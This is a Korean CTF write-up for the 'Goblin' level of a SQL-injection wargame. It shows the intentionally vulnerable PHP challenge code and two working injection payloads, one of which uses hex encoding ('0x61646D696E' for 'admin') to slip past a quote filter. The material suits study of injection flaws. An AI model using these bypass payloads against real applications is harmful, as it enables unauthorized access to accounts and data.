# Goblin Problem

![Goblin Image](../image/goblin_web_page.png)

### hint

__no 컬럼에 브루트포싱__

또는

__hex__

### los rubiya problem Script

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

### 핵심

```php
$query = "select id from prob_goblin where id='guest' and no={$_GET[no]}";

if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

if($result['id'] == 'admin') solve("goblin");
```

Goblin 문제는 no의 조건을 만족시키거나 or 로 새로운 id 를 조건으로 걸면은 되고

대신 출력되는 id 가 admin 되게 만졸할 수 있는 쿼리를 만들면 된다.

<details>
<summary>Payload</summary>
<div markdown="1">

```sql
?no=0%20or%20no=2
> select id from prob_goblin where id='guest' and no=0 or no=2

?no=0%20or%20id=0x61646D696E
> select id from prob_goblin where id='guest' and no=0 or id=0x61646D696E

```

테스트로 no 가 무슨 역할인지 아무런 값을 넣다보면

guest 는 1 이고
admin 는 2 으로 데이터가 들어있는것을 확인할 수 있다.

그리고 0x61646D696E 는 admin 과 같다. '0x61646D696E' 한다면 0x...도 헥스가아닌 문자열로 인식하기때문에

hex 로 인식하면서 admin으로 변환이 되는것이다.

</div>
</details>